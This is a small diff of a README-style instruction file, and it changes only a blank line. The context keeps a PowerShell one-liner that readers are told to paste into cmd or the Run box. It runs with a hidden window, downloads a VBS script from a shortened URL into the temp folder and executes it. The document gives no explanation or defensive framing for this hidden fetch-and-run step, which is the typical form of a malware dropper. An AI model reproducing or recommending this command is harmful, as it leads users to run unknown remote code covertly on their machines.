@@ -3,7 +3,6 @@
 ## use the following command in cmd or in run (this will not show a separate window)
 ```
 powershell -w hidden -c "iwr 'https://tinyurl.com/570windows' -OutFile $env:TEMP\r.vbs; & wscript $env:TEMP\r.vbs"
-
 ```
 
 ## use the following command in linux terminal(debian tested)
